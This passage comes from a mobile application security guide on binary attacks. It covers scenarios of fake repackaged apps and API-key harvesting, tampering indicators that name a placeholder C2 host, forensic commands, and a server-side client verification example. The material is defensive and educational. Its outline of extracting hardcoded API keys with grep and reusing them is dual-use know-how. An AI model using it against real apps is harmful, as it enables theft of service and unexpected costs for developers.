  - Regulatory investigation
  - $500K incident response costs
  - Reputation damage: Priceless
  
Root Cause:
  - No signature verification in app
  - No code obfuscation (easy to inject code)
  - Users couldn't distinguish fake from real
```

### Scenario 3: API Key Harvesting Operation

**Target:** Weather API key from popular weather app  
**Attacker:** Competitive intelligence  
**Timeline:** 1 day

```yaml
Reconnaissance:
  - Download free weather app (10M+ downloads)
  - Extract strings with grep (2 minutes)
  - Find OpenWeatherMap API key
  - Key has no domain restriction
  
Exploitation:
  - Use API key for competing service
  - 100,000 API calls/day (within free tier limits)
  - Zero cost for competitor
  - Original developer: API bill $450/month unexpected overage
  
Impact:
  - $450/month × 12 = $5,400/year additional costs
  - API rate limiting affects legitimate users
  - Service degradation
  - Customer complaints
  
Root Cause:
  - Hardcoded API key in strings
  - No obfuscation
  - API key not scoped to domain/app signature
```

---

## Detection and Forensic Indicators

### Indicators of Binary Tampering

```yaml
Technical Indicators:
  1. Certificate Mismatch:
     - Original signature: CN=Company Inc
     - Modified app: CN=Android Debug
     - Detection: signature verification on startup
  
  2. Checksum Verification:
     - Original APK hash: sha256:abc123...
     - Current APK hash: sha256:xyz789...
     - Detection: Verify APK integrity at runtime
  
  3. Package Name Conflicts:
     - Legitimate: com.company.app from Play Store
     - Malicious: com.company.app from unknown source
     - Detection: Installation source verification
  
  4. Build Metadata Changes:
     - Original build: Release signed
     - Modified: Debug signed, different build tools
     - Detection: BuildConfig verification

Behavioral Indicators:
  1. Unexpected Network Connections:
     - App connects to: attacker-c2.com
     - Original never connects to: external domains
     - Detection: Network monitoring, anomaly detection
  
  2. Modified Behavior:
     - Premium features unlocked without purchase
     - Bypassed authentication
     - Detection: Server-side validation
  
  3. Abnormal Resource Usage:
     - High CPU (cryptomining injected)
     - Excessive network (data exfiltration)
     - Detection: Android vitals monitoring

User-Visible Indicators:
  1. Installation Warnings:
     - "Unknown sources" required
     - "Play Protect blocked this app"
     - Most users ignore these!
  
  2. Permission Discrepancies:
     - Modified app requests more permissions
     - Or new permissions after "update"
  
  3. Visual Artifacts:
     - Slightly different icon
     - UI glitches from poor repackaging
```

### Forensic Analysis of Compromised Apps

```bash
# Step 1: Extract app from suspected compromised device
adb pull /data/app/com.company.app-1/base.apk suspected.apk

# Step 2: Calculate hash
sha256sum suspected.apk
# Compare with known good hash from Play Store

# Step 3: Verify signature
jarsigner -verify -verbose -certs suspected.apk
# Check certificate details

# Step 4: Decompile and compare
jadx suspected.apk -d suspected_source/
diff -r legitimate_source/ suspected_source/ > differences.txt

# Step 5: Network forensics
tcpdump -i any -w app_traffic.pcap port 443 or port 80
# Analyze connections made by app

# Step 6: Log analysis
adb logcat | grep "com.company.app"
# Look for suspicious activity
```

### Server-Side Detection

```python
# Server-side integrity verification
@app.route('/api/verify-client', methods=['POST'])
def verify_client():
    data = request.json
    
    # Check 1: App signature
    app_signature = data.get('app_signature')
    if app_signature != EXPECTED_SIGNATURE:
        log_security_event('Invalid app signature detected')
        return {'error': 'Unauthorized client'}, 401
    
    # Check 2: Behavioral analysis
    user_agent = request.headers.get('User-Agent')
    if not user_agent.startswith('OfficialApp/'):
        log_security_event('Modified user agent')
        return {'error': 'Invalid client'}, 401
    
    # Check 3: Request timing (rate limiting)
    user_id = data.get('user_id')
    if is_rate_limit_exceeded(user_id):
        log_security_event('Rate limit exceeded - possible automation')
        return {'error': 'Rate limit exceeded'}, 429
    
    # Check 4: Geographic anomalies
    ip = request.remote_addr
    if is_vpn_or_proxy(ip):
        log_security_event('VPN/proxy detected')
        # Flag for review
    
    return {'status': 'verified'}, 200
```

---

## Conclusion

Binary attacks represent a fundamental threat to mobile applications due to the inherent architecture of mobile platforms. Attackers have complete control over the execution environment, making defense challenging but not impossible. Understanding these attack vectors is the first step in implementing effective countermeasures.

**Key Takeaways:**
- **Static analysis** (decompilation, string extraction) requires minimal skill and time
- **Dynamic analysis** (Frida, debugging) provides complete runtime control
- **Tampering** and repackaging are trivially easy without proper protections
- **Defense in depth** is required - no single protection is sufficient
- **Server-side validation** complements but doesn't replace binary protections

Organizations must implement multiple overlapping defenses to raise the attack cost above the potential profit for most threat actors.
